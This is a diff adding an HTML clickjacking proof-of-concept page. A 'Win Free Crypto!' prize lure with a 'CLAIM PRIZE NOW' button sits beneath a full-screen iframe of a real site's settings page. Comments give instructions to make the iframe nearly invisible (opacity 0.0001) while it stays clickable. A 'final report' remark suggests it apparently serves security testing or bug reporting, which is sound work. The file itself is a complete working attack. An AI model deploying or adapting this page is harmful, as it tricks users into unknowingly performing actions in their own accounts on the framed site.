@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Win Free Crypto!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding-top: 100px;
+        }
+
+        /* 1. The Fake Button (The Bait) */
+        .fake-button {
+            position: absolute;
+            top: 250px; /* Adjust this to align exactly under the target button */
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 20px 40px;
+            background-color: #28a745;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            z-index: 1; /* Stays underneath the iframe */
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .fake-button:hover {
+            background-color: #218838;
+        }
+
+        /* 2. The Target Application (The Trap) */
+        .target-iframe {
+            position: absolute;
+            top: 0; 
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            
+            /* CRITICAL: Set to 0.5 for testing alignment. 
+               Set to 0.0001 for the final report to make it invisible but clickable. */
+            opacity: 0.5; 
+            
+            z-index: 2; /* Sits directly ON TOP of the fake button */
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🎉 You've Won a Special Prize! 🎉</h1>
+    <p>Click the button below to claim it immediately.</p>
+
+    <button class="fake-button">CLAIM PRIZE NOW</button>
+
+    <iframe class="target-iframe" src="https://tavron.net/settings"></iframe>
+
+</body>
+</html>
